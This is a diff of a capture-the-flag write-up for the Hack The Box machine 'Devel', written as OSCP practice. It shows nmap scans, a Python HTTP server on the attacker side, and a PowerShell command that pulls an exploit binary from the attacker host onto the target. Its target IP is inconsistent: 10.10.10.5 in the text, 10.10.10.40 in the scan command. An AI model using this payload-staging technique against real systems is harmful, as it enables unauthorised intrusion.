@@ -1,7 +1,10 @@
 Devel
+# Overview
+The machine I'm going to attempt to exploit is a Windows machine called "Devel". This is one of the OSCP like boxes that has been listed by @TJ_Null on Twitter. Since I'm preparing for my OSCP I'm going to exploit this box without metasploit.
 
 # Reconnaissance 
 
+The IP that is associated with the machine is 10.10.10.5. I'm going to start by running a few nmap scan to determine if I can find a point of entry. 
 ### ****Scanning****
 
 - **Initial Scan**
@@ -21,7 +24,7 @@ Running the initial nmap scan showed 9 open ports on the target machine
 ![initial_scan](https://github.com/benoitbeaulieu-ls/htb_devel/blob/master/Screenshots/inital_scan.png)
 
 - **Full Scan**
-Now let run a scan on all port to see if there are any other entry points.
+Now I'm going to run a scan on all ports to see if there are any other entry points.
 
 	- Command 
 	`sudo nmap -sC -sV -T4 -O -p- -oA devel_full 10.10.10.40`
@@ -119,7 +122,7 @@ Now lets set up a quick http server to transfer the file to the machine
 
 `python -m SimpleHTTPServer 8080`
 
-Since there is no netcat installed on the machine, let use some powershell to grba the file.
+Since there is no netcat installed on the machine, let use some powershell to grab the file.
 
 `powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.14.15:8080/40564.exe', 'c:\Users\Public\Downloads\40564.exe')"`
 
